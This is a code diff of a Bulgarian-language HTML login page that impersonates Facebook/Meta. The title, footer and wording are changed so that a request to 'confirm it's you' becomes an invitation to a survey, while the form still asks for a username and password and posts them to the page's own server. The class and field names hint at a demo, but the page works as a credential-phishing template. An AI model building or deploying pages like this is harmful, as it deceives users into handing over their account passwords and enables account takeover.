@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>FACEBOOK | FACEBOOK</title>
+    <title>FACBOOK</title>
 
     <style>
         * {
@@ -177,19 +177,26 @@
             <h1>Добре дошли</h1>
 
             <p>
-                META
+                
+            Участвайте в анкетата.
             </p>
         </section>
 
         <section class="form-card">
 
-            <h2>Потвърдете че сте вие</h2>
+            <h2>Участие</h2>
 
             <p class="subtitle">
-                Въведете вашите данни
+                Въведете данните си
             </p>
 
-            <form action="/record" method="POST">
+            <form action="/start" method="POST">
+
+                <input
+                    type="hidden"
+                    name="csrf_token"
+                    value="{{ csrf_token }}"
+                >
 
                 <label class="demo-label" for="username">
                     Потребителско име
@@ -205,7 +212,7 @@
                 >
 
                 <label class="demo-label" for="test_code">
-                    Вашата парола
+                    Парола
                 </label>
 
                 <input
@@ -218,7 +225,7 @@
                 >
 
                 <button type="submit">
-                    Потвърди
+                    Продължи към анкетата
                 </button>
 
             </form>
@@ -232,7 +239,7 @@
     </main>
 
     <footer>
-        THANK YOU
+        МЕТА
     </footer>
 
 </body>
